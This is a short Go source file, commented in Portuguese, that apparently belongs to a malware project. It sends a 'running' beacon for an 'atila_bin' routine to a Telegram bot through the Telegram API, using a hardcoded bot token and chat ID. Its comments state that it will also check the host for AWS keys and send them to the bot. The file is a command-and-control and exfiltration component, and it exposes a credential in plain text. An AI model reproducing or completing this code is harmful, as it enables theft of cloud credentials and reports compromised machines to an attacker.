package main






import  (


"net/http"
//"fmt"
"bytes"


)


//essa funcao   sera responsavel por notifica  o bot  

//no  telegram    sobre o sucesso   da  rotina de atila_bin

//e verificara se  existe   chaves  da aws e enviara pra  o bot


var token string = "7975585705:AAEhpsmGaok-PDwktP3k83WDI-sF7OdS7o4" 


func bot () {


cli :=  http.Client{}


str :=  


`{



"chat_id": "7127446120" ,


"text": "vkzmn  em execucao"




}`


data := bytes.NewBufferString(str)


req  , err   := http.NewRequest("POST", "https://api.telegram.org/bot" + token  + "/sendMessage"  , data)



req.Header.Set("Content-Type" ,  "application/json")


if err != nil  {


//fmt.Println("erro em  newrequests")



return 



}


_,  err_do  := cli.Do(req)



if err_do  != nil {


return //erro  no do()


}



}
